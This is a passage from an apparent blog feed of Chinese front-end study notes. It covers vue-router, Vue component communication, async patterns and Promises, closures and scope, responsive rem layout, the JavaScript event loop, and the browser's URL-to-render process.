对于服务器来说，频繁请求数据会耗用很多资源，如果该app的用户数量足够多，那么每多出来的一次请求，对于公司来说都是一笔巨大的开支，但是如果数据都储存在store中，并且这四个tab读取的都是同一份数据，那么在用户更新了资料时，只需要更新store中的数据，这样在进这四个不同的tab时，就减少了四次请求 vue-router1、什么是路由 根据路径选择不同的页面展示给用户（所有东西都是页面，也可以说是一个个组件，用路由在之间来回切换） 2、为什么使用路由 一般来说，每次请求一个地址都会发送给服务器进行处理，但是有些用户操作不需要请求服务器，直接在页面下修改逻辑就能达到目的，这种时候用路由就可以了。 3、前端路由是什么？如何实现 前端路由是找到与地址相匹配的组件并将它渲染出来，本质是：改变浏览器地址（更新视图）但不向服务器发出请求，有两种方法可以做到： hash模式 利用URL中的hash（“#”） history模式 利用 history.pushState API 来完成URL跳转而无须重新加载页面 4、vue-router实现步骤 在首页中添加两个script标签导入vue和vue-router1234567891011121314&lt;script src=&quot;js/vue.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;js/vue-router.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;app&quot;&gt; &lt;div&gt; &lt;!-- 用 router-link 组件来导航、传入 to 属性来指定链接、&lt;router-link&gt; 默认会被渲染成一个 a 标签 --&gt; &lt;router-link to=&quot;/&quot;&gt;Go to home&lt;/router-link&gt; &lt;router-link to=&quot;/topic&quot;&gt;Go to topic&lt;/router-link&gt; &lt;router-link to=&quot;/content&quot;&gt;Go to content&lt;/router-link&gt; &lt;/div&gt; &lt;!-- 路由出口，路由匹配到的组件将在这里被渲染出来 --&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; 定义vue组件123const home = &#123; template: &apos;&lt;div&gt;this is home page&lt;/div&gt;&apos; &#125;const topic = &#123; template: &apos;&lt;div&gt;this is topic page&lt;/div&gt;&apos; &#125;const content = &#123; template: &apos;&lt;div&gt;this is content page&lt;/div&gt;&apos; &#125; 定义路由12345const routes = [ &#123; path:&apos;/&apos;, component: home&#125;, &#123; path:&apos;/topic&apos;, component: topic&#125;, &#123; path:&apos;/content&apos;, component: content&#125;,] 创建router实例，并将定义的路由传入 const router = new VueRouter({ routes: routes }) 创建和挂载根实例123const app = new Vue(&#123; router: router&#125;).$mount(&apos;#app&apos;)]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue组件通信]]></title>
    <url>%2F2018%2F08%2F11%2FVue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[父子、兄弟组件间传值方式 父组件传数据给子组件父组件向下传递属性给子组件，子组件通过props接收并绑定该属性 子组件发事件给爸爸子组件通过$emit向上发出事件，爸爸监听该事件并定义相关方法 兄弟间组件传值1、创建一个事件总线，demo中的eventBus作为通信桥梁2、在需要传值的组件中用bus.$emit(‘xxx’)触发一个自定义事件，并传递参数3、在需要接收数据的组件中用bus.$on(‘xxx’, xxx-data =&gt; {})监听自定义事件，并在回调函数中处理传递过来的参数 完成下面需求：做一个点击事件，点击组件a的click，组件b中得到a的信息，即同级元素之间互相传值]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[异步编程的方式]]></title>
    <url>%2F2018%2F08%2F10%2F%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Promise的用法 异步编程的四种方式回调函数获取异步任务的结果。假设有两个函数f1和f2，f2需要等待f1的执行结果，如果f1是一个需要很长时间来执行的代码，则需要考虑改写f1，将f2作为f1的回调函数12345678function f1(callback)&#123; setTimeout(function()&#123; // f1的任务代码 callback(); &#125;, 1000)&#125;f1(f2) // 执行代码会变成这样 采用回调函数的方式，将同步操作变成异步，f1不会阻塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行 它的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度耦合，流程会很混乱，而且每个任务只能指定一个回调函数。 事件监听任务执行不取决于代码的顺序，而是事件是否发生（采用jQuery的写法）1f1.on(&apos;done&apos;, f2); // 当f1发生done事件，就执行f2 再改写f1中的代码123456function f1()&#123; setTimeout(function()&#123; // f1任务代码 f1.trigger(&apos;done&apos;) // 执行完成后，立即触发done事件，从而开始执行f2 &#125;, 1000)&#125; 它的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以解耦，有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。 发布订阅模式又称为观察者模式，将上面的事件理解成信号，假设有个信号中心，某个任务执行完就向中心发布一个信号，其他依赖于这个任务的可以向信号中心订阅这个信号，从而知道什么时间自己开始执行1jQuery.subscribe(&quot;done&quot;, f2); // f2向信号中心jQuery订阅done信号 接着对f1进行改写123456function f1()&#123; setTimeout(function()&#123; // f1的任务代码 jQuery.publish(&quot;done&quot;); // f1执行完后，向信号中心发送done信号，从而触发f2执行 &#125;, 1000);&#125; 与事件监听性质十分类似，但优于前者，我们可以通过信号中心查看设置了多少个信号，以及每个信号有多少个订阅者，从而监控程序运行 Promise对象定义：（参考阮一峰教程） Promise 是一个对象，对象里存储一个状态，这个状态是可以随着内部的执行转化的，为以下三种状态之一：等待态(Pending)、完成态(Fulfilled)、拒绝态(Rejected)。 一开始，我们先设置好等状态从 pending 变成 fulfilled 和 rejected 的预案（当成功后我们做什么，失败时我们做什么）。 Promise 启动之后，当满足成功的条件时我们让状态从 pending 变成 fullfilled （执行 resolve）；当满足失败的条件，我们让状态从 pending 变成 rejected（执行 reject） promise是回调的一种形式，同时也是一个事务管理器。他的作用是将各种内嵌回调的事务用流水形式表达，其目的是为了简化编程，让代码逻辑更加清晰。 1、then的链式用法（结合jQuery的写法）123$.ajax(&#123; url:&apos;/xxx&apos;,&#125;).then(successFn,errorFn).then(successFn2,errorFn2) 2、自己生成一个Promise对象12345678910function returnPromise()&#123; return new Promise(function(resolve, reject)&#123; setTimeout(()=&gt;&#123; resolve() // 成功后调用 reject() // 失败后调用 &#125;, 5000) &#125;)&#125;returnPromise().then(result) 3、async和await（两者的关系是相互依赖，通过await模拟同步代码）12345function returnPromise()&#123; ... ...&#125;var result = await returnPromise() //await的用法就是将异步代码写成同步的，await左边是同步，右边是异步结果，有了await它会等待异步的结果，从而改变整个代码的执行顺序，await后接一个返回promise的函数 4、try…catch捕获报错信息，catch是一个没有成功函数的失败函数，可以想象成then的语法糖12345678910function returnPromise()&#123; ... ...&#125;try&#123; var promise = await xxx() console.log(&apos;没出错&apos;)&#125;catch(error)&#123; console.log(&apos;异常了&apos;)&#125;]]></content>
      <tags>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JS——闭包再理解]]></title>
    <url>%2F2018%2F08%2F05%2F%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E2%80%94%E2%80%94%E9%97%AD%E5%8C%85%E5%86%8D%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[你不知道的Javascript上卷中再次回顾闭包的概念当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数当前是在词法作用域之外执行 1234567891011function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); // 2 这就是闭包的效果 函数bar的词法作用域能够访问foo的内部作用域，然后将bar函数本身当作一个值类型传递，在上面代码中，我们将bar所引用的函数对象本身当作返回值。 在foo()执行后，其返回值（也就是内部的bar函数）赋值给变量baz并调用baz()，实质上只是通过不同的标识符引用调用了内部的函数bar() 在foo()执行后通常会认为它的整个内部作用域会被销毁，因为JS引擎有垃圾回收释放内存的机制。然而，闭包的神奇之处就在于可以阻止作用域被销毁，因为bar函数仍在使用这个内部作用域，这个引用就叫闭包。 总结： 函数在定义时的词法作用域之外的地方被调用，而闭包使得函数可以继续访问定义时的词法作用域 只要是对函数类型的值进行传递，在函数被调用的时候，都可以看到闭包的身影 应用场景setTimeout延时函数1234567function wait(message)&#123; setTimeout(function timer()&#123; console.log(message); &#125;, 1000);&#125;wait(&quot;Hello, closure!&quot;); 将一个内部函数timer传递给setTimeout()，timer函数具有涵盖wait函数作用域的闭包，所以在函数外部，仍可以保有对message变量的引用 for循环和闭包12345for(var i=0;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;, i*1000);&#125; 对这段代码的预期是分别输出数字1～5，每秒一次，每次一个。当执行后发现，实际输出的效果是每秒一次的频率输出了5个6 因为 setTimeout 是个异步函数，所以会先把循环全部执行完毕，这时候 i 就是 6 了，所以会输出一堆 6。（这段代码的循环终止条件是i不再&lt;=5，这时i首次成立的条件是i=6，而for循环中声明的i变量是全局变量，当打印事件发生的时候，i已经完成了赋值操作，即i=6，所以控制台打印的结果总是6） 这里没有达到我们预期效果的原因在于，我们试图假设循环中每次迭代在运行时都会给自己捕获一个i的副本，但根据作用域的工作原理，虽然循环中的五个函数是在各个迭代中分别定义的，但它们都被封闭在一个共享的全局作用域中，因此实际上只有一个i 在循环的过程中每个迭代都需要一个闭包作用域，下面有两种解决办法： 创建一个变量用来在每次迭代中储存i的值（闭包的方式）12345678for(var i=0;i&lt;=5;i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;, j*1000); &#125;)();&#125; 用立即执行函数，创造一个函数作用域。在每次i值改变的时候，都把i的值保存给内部函数作用域的变量j，因为立即执行函数跟i赋值的时候可以说是同步执行的，然后控制台的时候，就会拿到函数作用域中的i。 let声明可以劫持块作用域，并在这个块作用域中声明一个变量12345for(let i=0;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;, i*1000);&#125; 将let声明在for循环头部同样可以解决问题，它还有一个特殊的行为，这个行为指出变量在循环过程中不止被声明一次，每次迭代都会声明，随后的每个迭代都会使用上一个迭代结束时的值来初始化这个变量。 使用 setTimeout 的第三个参数，这个参数会被当成 timer 函数的参数传入12345for(var i=0;i&lt;=5;i++)&#123; setTimeout(function timer(j)&#123; console.log(j); &#125;, i*1000, i)&#125;]]></content>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[作用域及闭包]]></title>
    <url>%2F2018%2F08%2F05%2F%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E9%97%AD%E5%8C%85%2F</url>
    <content type="text"><![CDATA[执行上下文环境到作用域再到闭包 执行上下文环境 说到作用域，首先理解一下执行上下文环境（在执行代码之前，把要用到的变量先取出来，有的直接赋值，有的用undefined占位） 对于普通变量和函数表达式，声明并默认赋值 undefined 12var a = 1 //var a 提升，默认值为undefinedvar fn = function()&#123;&#125; 对于函数声明，会赋值 1function fn()&#123;&#125; 作用域 什么是作用域： 作用域是你的代码在运行时，各个变量、函数和对象的可访问性。换句话说，作用域决定了你的代码里的变量和其他资源在各个区域中的可见性。 为什么需要作用域？最小访问原则 那么，限制变量的可见性，不允许你代码中所有的东西在任意地方都可用的好处是什么？其中一个优势，是作用域为你的代码提供了一个安全层级。计算机安全中，有个常规的原则是：用户只能访问他们当前需要的东西。 下面来看一下具体的作用域的问题，可以将作用域抽象的理解为一块地盘，当中没有变量的概念，需要通过作用域对应的执行上下文环境来获取变量的值，所以作用域中变量的值是在执行过程中产生和确定的，而作用域是在函数创建时就确定了。还要记住一点：除了全局作用域，只有函数才能创建作用域 第一步，加载程序时就确定了全局上下文环境，每个函数也都会创建自己的作用域，函数的作用域在创建时就已经确定，而不是在调用的时候 第二步，执行到最后一行调用函数fn(10)，此时生成fn函数的上下文环境，并将它设置成活跃状态 第三步，执行到调用bar(100)，此时生成bar函数的上下文环境，并将它设置成活跃状态 第四步，调用完bar(100)，它的上下文环境被销毁，接着调用bar(200)，生成它的上下文环境，并设置成活跃状态 第五步，bar(200)调用结束，它的上下文环境被销毁，此时又会回到fn(10)的上下文环境，并将它设置成活跃状态 第六步，执行完fn(10)，它的上下文环境销毁，此时又回到全局上下文环境的活跃状态 作用域链：当你需要用到一个变量时，在哪个作用域中取得这个变量，这是一个由内而外的查找过程，一层一层直到全局作用域为止，需要注意的是，要到创建这个函数的作用域中取值而不是调用函数的时候 作用域和执行上下文环境的关系作用域指的是变量的可见性，上下文指的是在相同作用域中this的值，我们可以使用函数方法改变上下文，在全局作用域中，上下文总是Window对象。一个作用域下可能包含了若干的上下文环境；有可能没有过上下文环境（函数始终没有被调用）；有可能有过，但在函数被调用完之后，上下文环境被销毁；有可能存在一个或多个（即闭包） 闭包 闭包的概念与词法作用域紧密相关，当内部函数试着访问外部函数的作用域链（词法作用域之外的变量）时产生闭包，闭包包括了它们自己的作用域链、父级作用域链和全局作用域链 结合上面对作用域的理解，闭包的一个核心内容是：当函数调用完之后，它的执行上下文环境不会接着被销毁123456789101112var func = function()&#123; var a = &apos;jayce&apos;; var fn1 = function()&#123; a += &apos; xi&apos;; console.log(a); &#125; return fn1&#125;var fn2 = func();fn2(); // jayce xifn2(); // jayce xi xi 当你第一次调用完fn2之后，func中的变量a变成’jayce xi’，而没有被销毁，fn1就形成了一个闭包，变量a的生命也因此得以延续。闭包有三个特点： 它是一个函数，比如上面例子中的fn1 函数中使用了其他作用域中的变量，使得变量不会被销毁，如上面的fn1调用了它上级作用域func中的变量a 闭包存在在定义该变量的作用域中，上面的变量a存在于func函数的局部作用域中，fn1也存在于此 闭包是什么：函数、函数内部可以访问到的变量的总和（也叫环境），就是一个闭包。函数内部返回了一个函数，而函数一个很重要的特点在于可以创建一个独立作用域，当这个要返回的函数体中，需要引用一个变量，这个变量存在于它的上级函数的作用域中，那么这个变量所在的上级函数的上下文环境就不能被销毁，否则就不能获取这个变量了。（访问上级作用域中的变量的权限） 闭包解决了什么：因为闭包可以访问上级作用域，从而打破因作用域引起的函数外部不能访问另一个函数内部变量的束缚，就拿ajax的成功回调来说，这里就是一个闭包的概念，回调函数拥有了访问和操作上级作用域的能力，带来了极大的便利。 闭包的应用场景：ajax请求的成功回调、setTimeout延时回调、一个函数内部返回一个匿名函数、事件上绑定的回调方法，不管是哪种方式，只要是对函数类型的值进行传递，当函数在别处被调用时都是闭包的一个具体表现 作用： 隐藏变量，但通过返回一个函数使得外部可以访问这个变量 封装对象的私有属性和方法]]></content>
      <tags>
        <tag>作用域 闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[响应式布局及动态rem]]></title>
    <url>%2F2018%2F08%2F03%2F%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80%E5%8F%8A%E5%8A%A8%E6%80%81rem%2F</url>
    <content type="text"><![CDATA[移动端适配及动态rem方案 使用meta标签 在做移动端页面时，要使用meta标签，它用来控制页面在移动端不要缩放，如果没有指定，将会默认为980px，它指定了以下内容：1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1, minimum-scale=1&quot;&gt; 芳芳老师曾经给过一个答案，它的作用是这样来的：一开始的页面都是为PC端准备的，在乔布斯推出了iPhone3GS手机后，PC端的页面不能适应手机屏幕的大小，所以苹果工程师想出了一个办法，默认将手机模拟成980px，使得页面缩小可以适应手机屏幕，后来智能手机普及，这个功能部分网站不再需要，所以就用meta:vp来控制手机页面不要缩放。 @media媒体查询功能 有两种方式加入媒体查询 在style标签中直接插入 @media 后接查询条件，如果满足条件，里面的CSS代码就生效 1234567&lt;style&gt; @media(min-width: 320px) and (max-width: 375px)&#123; //在设备最小宽度为320px，最大宽度375px时body的背景颜色才会被改变 body&#123; background: pink; &#125; &#125;&lt;/style&gt; 在link标签中引用media 1&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;(max-width: 320px)&quot;&gt; //在最大宽度为320px时，才会执行style.css文件 这里有一点要注意，虽然css代码是有条件的执行，但是css文件总是会被下载，只是看是否生效 用很多套css样式来匹配不同的设备宽度 123456789101112131415161718192021222324252627&lt;style&gt; @media (min-width: 769px)&#123; /*769~正无穷*/ body&#123; background: purple; &#125; &#125; @media (max-width: 768px)&#123; /* 0~768 */ body&#123; background: yellow; &#125; &#125; @media (max-width: 425px)&#123; /* 0~425 */ body&#123; background: orange; &#125; &#125; @media (max-width: 375px)&#123; /* 0~375 */ body&#123; background: pink; &#125; &#125; @media (max-width: 320px)&#123; /* 0~320 */ body&#123; background: green; &#125; &#125;&lt;/style&gt; 这里要注意一个优先级的问题，如果将最大宽度的顺序从小往大写，可能存在前面的样式被覆盖的问题，解决方法可以是上面那样将顺序颠倒，使得最大宽度的顺序从大往小；或者将查询条件写到很具体，使得条件之间没有交集123456789101112131415161718192021222324252627&lt;style&gt; @media (max-width: 320px)&#123; /* 0~320 */ body&#123; background: yellow; &#125; &#125; @media (min-width: 321px) and (max-width: 375px)&#123; /* 321~375 */ body&#123; background: orange; &#125; &#125; @media (min-width: 376px) and (max-width: 425px)&#123; /* 376~425 */ body&#123; background: pink; &#125; &#125; @media (min-width: 426px) and (max-width: 768px)&#123; /* 426~728 */ body&#123; background: green; &#125; &#125; @media (min-width: 769px)&#123; /*769~正无穷*/ body&#123; background: purple; &#125; &#125;&lt;/style&gt; 动态rem 页面中，默认的字体大小(font-size)是16px，Chrome默认最小字体是12px rem指的是根元素的 font-size 大小（例如 元素的font-size） 1234567891011html:&lt;body&gt; &lt;p&gt; 你好，我是xxx &lt;/p&gt;&lt;/body&gt;css:p&#123; font-size: 2rem; /* 这里的2rem是指字体大小为32px，因为页面默认font-size为16px，1rem = 16px */&#125; 1234567css:body&#123; font-size: 20px;&#125;p&#123; font-size: 2rem; /* 这里的2rem仍然是32px，虽然设置了body的字体大小，但是rem指的是根元素html的字体大小，所以这里仍然是1rem = 16px的默认值 */&#125; 如果像下面这样设置了html的字体大小，那么 1rem 就是设置的字体大小1234567css:html&#123; font-size: 20px;&#125;p&#123; font-size: 2rem; /* 这时p标签里的内容就是40px，因为设置了根元素的字体大小为20px，那么 1rem = 20px，而不是默认值16px了 */&#125; 适配手机的页面布局（百分比布局） 这样的设计方法可以适配不同宽度的手机，但缺点是宽度和高度不能调试，因为宽度不是一个固定的值，所以高度也没办法确定 引入动态rem方案 它的主要思路是所有元素按比例放大或缩小（一切以宽度为基准），同时还解决了高度和宽度没有关联的问题 用JS来设置html的font-size等于页面宽度，而rem是依赖html的font-size的，进而使得rem间接依赖于页面宽度，可以这么理解 1 rem == html font-size == viewport width rem也可以与其他单位同时存在123font-size: 16px;border: 1px solid red;width: 0.5rem; 下面以实现这样一个设计稿为例： 用JS获取屏幕宽度做单位换算1234&lt;script&gt; var pageWidth = window.innerWidth //获取屏幕宽度 document.write(&apos;&lt;style&gt; html&#123; font-size:&apos; + pageWidth/10 + &apos;px;&#125;&lt;/style&gt;&apos;) //用给定像素值除以屏幕宽度再乘以10得到的数字是以rem为单位&lt;/script&gt; 123456789101112131415161718192021222324252627282930html: &lt;div class=&quot;parent clearfix&quot;&gt; &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt; &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt; &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt; &lt;div class=&quot;child&quot;&gt;40%&lt;/div&gt; &lt;/div&gt;css:&lt;style&gt; *&#123; margin: 0; padding: 0; &#125; body&#123; font-size: 16px; &#125; div.child&#123; float: left; background: #ddd; width: 4rem; height: 2rem; margin: .5rem .5rem; &#125; .clearfix::before&#123; content: &apos;&apos;; display: block; clear: both; &#125;&lt;/style&gt; 效果图： 但是有个缺点就是每个元素的宽高都需要通过计算来得到，这样工作量会很大，解决方法是使用sass函数减少计算量 首先，使用命令行安装sass npm config set registry https://registry.npm.taobao.org/ touch ~/.bashrc echo ‘export SASS_BINARY_SITE=”https://npm.taobao.org/mirrors/node-sass&quot;&#39; &gt;&gt; ~/.bashrc source ~/.bashrc npm i -g node-sass mkdir ~/Desktop/scss-demo cd ~/Desktop/scss-demo mkdir scss css touch scss/style.scss start scss/style.scss node-sass -wr scss -o css 然后，在sass文件中添加下面的代码1234567891011121314@function pxToRem( $px )&#123; @return $px/$designWidth*10 + rem;&#125; //这个函数可以将像素值转换成以rem为单位$designWidth : 640; // 640是设计稿的宽度，根据实际要求修改即可div.child&#123; width: pxToRem(320); height: pxToRem(160); margin: pxToRem(40) pxToRem(40); border: 1px solid red; float: left; font-size: 1.2em;&#125; 通过sass函数的转译，我们可以直接使用px为单位，这样大大节省了计算时间]]></content>
      <tags>
        <tag>响应式 rem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS引擎执行机制]]></title>
    <url>%2F2018%2F08%2F02%2FJS%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[从JS是一门单线程语言讲起 灵魂三问： 为什么JS是一门单线程语言 为什么JS需要异步 JS单线程如何实现异步 为什么JS是一门单线程语言如果说在浏览器中，JS是多线程的，有如下场景： 在浏览器中，有两个进程process1和process2，因为JS是多进程的，所以他们对同一个dom同时进行操作。process1删除了该dom，而process2编辑了该dom，同时下达两个矛盾的命令，浏览器如何执行？ 为什么JS需要异步如果JS中不存在异步，只能自上而下按顺序执行，如果上一行解析需要很长时间，那么下面的代码就会被阻塞，对于用户而言阻塞就会导致页面卡死，进而影响用户体验 JS单线程如何实现异步通过事件循环（event loop），理解了该机制，也就明白了JS的执行机制 观察如下代码1234567console.log(1)setTimeout(function()&#123; console.log(2)&#125;, 0)console.log(3) 浏览器会分别打印出：1 3 2 setTimeout里的函数并没有立即执行，而是延迟了一段时间，满足了一定条件后才去执行，这类代码叫做异步代码。所以按照上面代码可以将任务分成同步任务和异步任务，按照这种分类方式，JS的执行机制是： 首先判断是同步还是异步，同步就进入主进程，异步就进入event table 异步任务在event table中注册函数，当满足触发条件后被推入事件队列 同步任务在进入主进程后一直执行，直到主进程空闲，才会去事件队列中查看是否有可执行的异步任务，如果有就推入主进程中 但仅仅是上面这样就结束了吗？？？再看下面的代码1234567891011121314setTimeout(function()&#123; console.log(&apos;定时器开始啦&apos;)&#125;);new Promise(function(resolve)&#123; console.log(&apos;马上执行for循环啦&apos;); for(var i=0;i&lt;10000;i++)&#123; i == 99 &amp;&amp; resolve(); &#125;&#125;).then(function()&#123; console.log(&apos;执行then函数啦&apos;)&#125;);console.log(&apos;代码执行结束&apos;); 按照上面的理解去分析JS的执行机制： setTimeout是异步任务，进入event table里 new Promise是同步任务，放到主进程里，控制台打印：马上执行for循环啦 .then函数里的是异步任务，放到event table里 console.log是同步代码，放到主进程里，打印：代码执行结束照这样打印出的顺序是：马上执行for循环啦—代码执行结束—定时器开始啦—执行then函数啦 但是实际执行后的结果却是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦 这么说按照同步任务和异步任务划分并不准确！！而准确的方式是（妈ma 咪mi 宏任务在前，微任务在后） 宏任务（macro-task）：包括整体代码script、setTimeout、setInterval 微任务（micro-task）：Promise、process.nextTick 按照这种方式，JS的执行机制是： 执行一个宏任务，过程中遇到微任务，将它放到微任务的事件队列里 当前宏任务执行完成后，会去查看微任务的事件队列，并将里面的微任务一次执行完，然后才会进入下一个宏任务 重复上面的两个步骤 下面再次分析第二段代码： 首先执行script中的宏任务，遇到setTimeout，将它放到宏任务的事件队列里 遇到new Promise立即执行（它是同步的），打印：马上执行for循环啦 遇到then方法，是微任务，将它放到微任务的事件队列里 打印：代码执行结束 本轮宏任务执行完，查看微任务，发现有一个then方法里的函数，打印：执行then函数啦 到这儿本轮的事件循环（event loop）结束 进入下一轮循环，先执行一个宏任务，发现宏任务队列里有一个setTimeout函数，执行并打印：定时器开始啦 于是，真正的代码执行顺序是：马上执行for循环啦—代码执行结束—执行then函数啦—定时器开始啦 setTimeout123setTimeout(function()&#123; console.log(&apos;执行了&apos;)&#125;, 3000) 我们一般会解释为3秒之后执行setTimeout里的函数，但这种说法不严谨。准确来说，3秒后，setTimeout里的函数会被推到事件队列里（event queue），而事件队列里的任务只有在主线程空闲时才会去执行 所以要满足 3秒后; 主线程空闲; 同时满足时才会在3秒后执行该函数 如果主线程任务很多，执行时间超过了3秒，比方执行了5秒，那这个函数也只能在5秒后被执行]]></content>
      <tags>
        <tag>单线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从输入url到页面加载完成]]></title>
    <url>%2F2018%2F08%2F02%2F%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90%2F</url>
    <content type="text"><![CDATA[网上那么多总结，你理清楚了嘛 大致流程 用户输入url地址，浏览器解析url解析出主机名 DNS查询（从主机名到一个服务器IP地址的转换） 建立一条与目标web服务器的TCP连接（客户端和服务端都需要到各自可收发，因此需要三次握手） 发送HTTP请求（请求四部分） 后台处理请求（监听80端口、路由、渲染HTML模版、生成响应） 发送HTTP响应 关闭TCP连接（四次挥手） 浏览器解析并渲染页面 DNS查询（从主机名到一个服务器IP地址的转换） 网址：URL（统一资源定位符）用于定位互联网上的资源，格式一般为：协议类型://&lt;主机名&gt;:&lt;端口&gt;/&lt;路径&gt;/文件名 IP地址：例如代表本机的IP就是127.0.0.1，每个网站都是靠IP来定位的。比方说知乎的网址是 https://www.zhihu.com/ 但浏览器并不知道它是什么，而是需要通过查找该网址所在服务器的IP地址获得目标，这个过程就是域名解析 DNS查询获得IP地址 a. 查找浏览器缓存看是否有该域名对应的解析过的IP地址；b. 查找操作系统缓存，浏览器会从hosts文件查找是否储存有DNS信息，是否有目标域名及对应的IP地址；c. 查找路由器缓存；d. 查找ISP(Internet Service Provider) DNS 缓存服务器；e. 迭代查询，从顶级域名服务器的根域名服务器开始递归查询 建立TCP连接三次握手：由客户端执行connect来触发 1、client将标志位SYN设置为1，随机产生一个seq=J，并将数据包发送给server，此时client进入SYN_SEND状态，等待server确认 2、server收到数据由标志位SYN=1知道客户端想要请求建立连接，server将标志位SYN和ACK都设置为1，ack=J+1（序号+1），随机产生一个seq=k，并将数据包发送给client确认连接请求，此时server进入SYN_RCVD状态 3、client收到确认后，检查ACK是否为1，ack是否为J+1，如果正确则连接成功，此时client和server都进入ESTABLISHED状态，完成三次握手 发送HTTP请求在得到IP地址后，浏览器会发送出一个HTTP请求，请求包括请求头和请求体。请求头通常有：请求方法（GET、POST、HEAD、OPTIONS, PUT, DELETE, TRACE 和 CONNECT）、目标url、遵循的协议（http、https、file等） 后台处理请求服务器通过http报文作为信息载体将数据返回给客户端 常用请求头：123456789101112Accept: 接收类型，表示浏览器支持的MIME类型（对应服务端返回的Content-Type）Content-Type：客户端发送出去实体内容的类型Content-length：用来指明发送给接收方的消息主体的大小Cache-Control: 指定请求和响应遵循的缓存机制，如no-cacheExpires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中Cookie: 有cookie并且同域访问时会自动带上Host：请求的服务器URLOrigin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)User-Agent：用户客户端的一些必要信息，如UA头部等 常用响应头12345678910111213Access-Control-Allow-Headers: 服务器端允许的请求HeadersAccess-Control-Allow-Methods: 服务器端允许的请求方法Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）Content-Type：服务端返回的实体内容的类型Date：数据从服务器发送的时间Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档Last-Modified：请求资源的最后修改时间Expires：应该在什么时候认为文档已经过期,从而不再缓存它Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效ETag：请求变量的实体标签的当前值Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）Server：服务器的一些相关信息 通常请求头和响应头是相互匹配的123- 请求头部的Accept要和响应头部的Content-Type匹配，否则会报错- 跨域请求时，请求头部的Origin要匹配响应头部的Access-Control-Allow-Origin，否则会报跨域错误- 在使用缓存时，请求头部的If-Modified-Since、If-None-Match分别和响应头部的Last-Modified、ETag对应 关闭TCP连接四次挥手1234主动方：我已经关闭了向你那边的主动通道，此时你只能被动接受被动方：我收到了通道关闭的消息被动方：好的那我告诉你，我也关闭了这边向你的主动通道主动方：最后收到通知，之后双方无法通信 浏览器解析并渲染页面流程：解析HTML，构建DOM树 -&gt; 解析CSS，生成CSS规则树 -&gt; 下载并解析JS -&gt; 下载并解析图片（异步下载，不会阻塞解析流程） -&gt; 合并DOM和CSS规则，生成render树 -&gt; 布局并渲染render树 -&gt; 执行JS文件]]></content>
  </entry>
  <entry>
    <title><![CDATA[跨域的三种方式]]></title>
    <url>%2F2018%2F08%2F01%2F%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
